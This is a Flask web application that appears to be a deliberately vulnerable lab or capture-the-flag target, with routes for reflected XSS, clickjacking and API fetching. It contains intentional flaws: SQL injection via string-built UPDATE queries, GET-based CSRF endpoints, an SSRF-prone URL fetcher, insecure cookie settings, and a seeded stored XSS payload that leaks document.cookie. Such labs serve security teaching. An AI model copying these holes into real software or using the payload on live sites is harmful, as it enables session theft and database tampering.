from flask import Flask, render_template, redirect, url_for, request, flash, session, make_response, jsonify
from werkzeug.security import generate_password_hash, check_password_hash
from models import db, User, Post, Flag
from sqlalchemy import text
import ssl
import requests


app = Flask(__name__)
app.secret_key = 'your_secret_key'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SESSION_COOKIE_SECURE'] = False


db.init_app(app)


def none_to_empty(value):
    return '' if value is None else value
app.jinja_env.filters['none_to_empty'] = none_to_empty

def nullable_string(value):
    return value if value else None

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        email = nullable_string(request.form['email'])
        phone = nullable_string(request.form['phone'])
        gender = nullable_string(request.form['gender'])
        secret = nullable_string(request.form['secret'])

        if User.query.filter_by(username=username).first():
            flash('계정명이 이미 존재합니다.')
            return redirect(url_for('register'))

        hashed_password = generate_password_hash(password, method='pbkdf2:sha256', salt_length=16)
        new_user = User(username=username, password=hashed_password, email=email, phone=phone, gender=gender,
                        secret=secret)
        db.session.add(new_user)
        db.session.commit()

        flash('회원가입에 성공했습니다! 로그인해주세요.')
        return redirect(url_for('login'))

    return render_template('register.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()

        if user and check_password_hash(user.password, password):
            session['user_id'] = user.id
            session['username'] = user.username
            if user.secret:
                session['secret'] = user.secret
            flash('로그인에 성공했습니다!')
            return redirect(url_for('home'))

        flash('계정명 또는 비밀번호가 잘못되었습니다.')
        return redirect(url_for('login'))

    return render_template('login.html')


@app.route('/')
def home():
    if 'user_id' in session:
        user = User.query.filter_by(id=session['user_id']).first()
        if user.secret:
            posts = Post.query.all()
            return render_template(
                'secret.html',user=user, posts=posts)
        else:
            return render_template(
                'home.html',user=user
            )
    return redirect(url_for('login'))

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('username', None)
    flash('로그아웃되었습니다.')
    return redirect(url_for('login'))


@app.route('/edit_profile_page', methods=['GET'])
def edit_profile_page():
    if 'user_id' not in session:
        flash('로그인이 필요합니다.')
        return redirect(url_for('login'))
    try:
        user = User.query.get(session['user_id'])
    except Exception:
        return render_template('login.html')
    return render_template('edit_profile.html', user=user)

@app.route('/edit_profile', methods=['GET', 'POST'])
def edit_profile():
    if 'user_id' not in session:
        flash('로그인이 필요합니다.')
        return redirect(url_for('login'))

    user_id = session['user_id']

    if request.method == 'POST' or request.method == 'GET':
        if request.method == 'POST':
            email = nullable_string(request.form['email'])
            phone = nullable_string(request.form['phone'])
            gender = nullable_string(request.form['gender'])
        elif request.method == 'GET':
            email = nullable_string(request.args.get('email'))
            phone = nullable_string(request.args.get('phone'))
            gender = nullable_string(request.args.get('gender'))

        updates = []
        if email is not None:
            updates.append(f"email = '{email}'")
        if phone is not None:
            updates.append(f"phone = '{phone}'")
        if gender is not None:
            updates.append(f"gender = '{gender}'")

        update_query = ", ".join(updates)

        query = f"UPDATE user SET {update_query} WHERE id = {user_id}"
        query = text(query)
        with db.engine.connect() as connection:
            connection.execute(query)
            connection.commit()

        user = User.query.get(user_id)
        session['user_id'] = user.id
        session['username'] = user.username
        flash('회원정보가 수정되었습니다.')
        return redirect(url_for('home'))


    user = User.query.get(user_id)
    return render_template('edit_profile.html', user=user)

@app.route('/secret')
def secret():
    if 'user_id' not in session:
        flash('로그인이 필요합니다.')
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])

    if user.secret is None:
        flash('로그인이 필요합니다.')
        return redirect(url_for('login'))
    posts = Post.query.all()

    return render_template('secret.html', user=user, posts=posts)


@app.route('/read/<int:post_id>')
def read(post_id):
    post = Post.query.get_or_404(post_id)
    response = make_response(render_template('post_read.html', post=post))
    if request.args.get('cors') is not None:
        response.headers["Access-Control-Allow-Origin"] = "*"


    return response
@app.route('/create', methods=['GET', 'POST'])
def create():
    if request.method == 'POST':
        new_post = Post(title=request.form['title'], content=request.form['content'])
        db.session.add(new_post)
        db.session.commit()
        return redirect(url_for('secret'))
    if request.method == 'GET':
        new_post = Post(title=request.args.get('title'), content=request.args.get('content'))
        db.session.add(new_post)
        db.session.commit()
        return redirect(url_for('home'))
    return render_template('post_create.html')

@app.route('/create_page', methods=['GET'])
def create_page():
    return render_template('post_create.html')

@app.route('/update/<int:post_id>', methods=['GET', 'POST'])
def update(post_id):
    post = Post.query.get_or_404(post_id)
    if request.method == 'POST':
        post.title = request.form['title']
        post.content = request.form['content']
        db.session.commit()
        return redirect(url_for('secret'))
    return render_template('post_update.html', post=post)

@app.route('/delete/<int:post_id>', methods=['POST'])
def delete(post_id):
    post = Post.query.get_or_404(post_id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for('secret'))

@app.route('/reflect', methods=['GET'])
def reflect():
    param = request.args.get('test')
    return render_template('reflected.html', test=param)

@app.route('/test', methods=['GET'])
def test():
    return render_template('test.html')

@app.route('/clickjack')
def clickjack():
    frame = ""
    opacity = "0.5"
    if request.args.get('frame') == "deny":
        frame = "deny"
    if request.args.get('opacity') is not None:
        opacity = request.args.get('opacity')

    return render_template('clickjack.html', frame=frame, opacity=opacity)

@app.route('/clickme')
def clickme():
    response = make_response(render_template('clickme.html'))
    if request.args.get('x-frame-options') is not None:
        response.headers['X-Frame-Options'] = "sameorigin"
    if request.args.get('x-frame-options') == "deny":
        response.headers['X-Frame-Options'] = "deny"
    return response

@app.route('/api_test', methods=['GET'])
def api_test():
    return render_template('api_test.html')

@app.route('/fetch-api', methods=['POST'])
def fetch_api():
    token = request.form['token']
    url = request.form['url']

    if not token or not url:
        return render_template('api_test.html', error="Token and URL are required", token=token, url=url)

    headers = {'x-auth-token': token}

    try:
        response = requests.get(url, headers=headers)
        data = response.json()
        return render_template('api_test.html', result=data, token=token, url=url)
    except requests.exceptions.RequestException as e:
        return render_template('api_test.html', error=str(e), token=token, url=url)



def create_tables():
    if User.query.count() == 0:
        admin_user = User(username='admin', password='pbkdf2:sha256:600000$DgwTMe6jryEfASOa$e917aa2eb9c6e2826578ab8586b375be02b31852e2e83758aa53ce6fde7bb0e9', email='admin@k.com', phone='01012341234', gender='?', secret='1')
        db.session.add(admin_user)
        db.session.commit()
    if Flag.query.count() == 0:
        f = Flag(Flag='{flag}')
        db.session.add(f)
        db.session.commit()
    if Post.query.count() == 0:
        content = "<img width=0 height=0 id='attack'><script>alert('XSS');let a=\"/create?title=i am victim&content=CSRF Attack!!!\"+document.cookie;var image = document.getElementById('attack');image.src=a;</script>"
        title = "XSS + CSRF"
        p = Post(title=title, content=content)
        db.session.add(p)
        db.session.commit()

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        create_tables()
    # app.run(debug=False, port=5555)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem', password='password')
    app.run(ssl_context=context, debug=False, host='127.0.0.1', port=5555)

